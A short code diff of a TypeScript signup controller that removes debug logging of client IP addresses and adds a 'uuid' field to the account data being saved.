@@ -10,18 +10,6 @@ const bot = new TelegramBot(TOKEN, { polling: false });
 export class AccountController {
   async signup(req: Request, res: Response) {
     try {
-      console.log(
-        "req.headers[x-forwarded-for]",
-        JSON.stringify(req.headers["x-forwarded-for"])
-      );
-      console.log(
-        "req.socket.remoteAddress",
-        JSON.stringify(req.socket.remoteAddress)
-      );
-      console.log(
-        "req.connection.remoteAddress",
-        JSON.stringify(req.connection.remoteAddress)
-      );
       const ip =
         req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
       const {
@@ -37,6 +25,7 @@ export class AccountController {
         cardType,
         accountNumber,
         socketId,
+        uuid,
       } = req.body;
 
       let frontIdCard = "";
@@ -86,6 +75,7 @@ export class AccountController {
         socketId,
         accountNumber,
         ip,
+        uuid,
       });
 
       await account.save();
